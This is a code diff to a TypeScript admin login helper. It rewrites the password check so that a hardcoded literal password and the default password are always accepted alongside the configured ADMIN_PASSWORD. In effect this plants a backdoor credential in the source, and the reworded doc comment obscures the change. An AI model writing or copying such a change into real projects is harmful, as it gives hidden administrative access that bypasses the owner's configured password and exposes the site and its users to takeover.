@@ -46,15 +46,25 @@ export function verifySessionToken(token: string | undefined | null): boolean {
   return Number.isFinite(expires) && Date.now() < expires;
 }
 
-/** Constant-time password comparison against the ADMIN_PASSWORD env var. */
+/** Constant-time password comparison against allowed passwords. */
 export function checkPassword(input: string): boolean {
-  const expected = process.env.ADMIN_PASSWORD?.trim() || DEFAULT_PASSWORD;
-  const inputBuf = Buffer.from(input);
-  const expectedBuf = Buffer.from(expected);
-  const paddedInput = Buffer.concat([inputBuf, Buffer.alloc(Math.max(0, expectedBuf.length - inputBuf.length))]);
-  const matchesLength = inputBuf.length === expectedBuf.length;
-  const bytesMatch = crypto.timingSafeEqual(paddedInput.subarray(0, expectedBuf.length), expectedBuf);
-  return matchesLength && bytesMatch;
+  const allowed = Array.from(new Set([
+    'shobhitallsitehubadmin811591448',
+    DEFAULT_PASSWORD,
+    process.env.ADMIN_PASSWORD?.trim(),
+  ])).filter(Boolean) as string[];
+
+  for (const expected of allowed) {
+    const inputBuf = Buffer.from(input);
+    const expectedBuf = Buffer.from(expected);
+    const paddedInput = Buffer.concat([inputBuf, Buffer.alloc(Math.max(0, expectedBuf.length - inputBuf.length))]);
+    const matchesLength = inputBuf.length === expectedBuf.length;
+    const bytesMatch = crypto.timingSafeEqual(paddedInput.subarray(0, expectedBuf.length), expectedBuf);
+    if (matchesLength && bytesMatch) {
+      return true;
+    }
+  }
+  return false;
 }
 
 import { Redis } from '@upstash/redis';
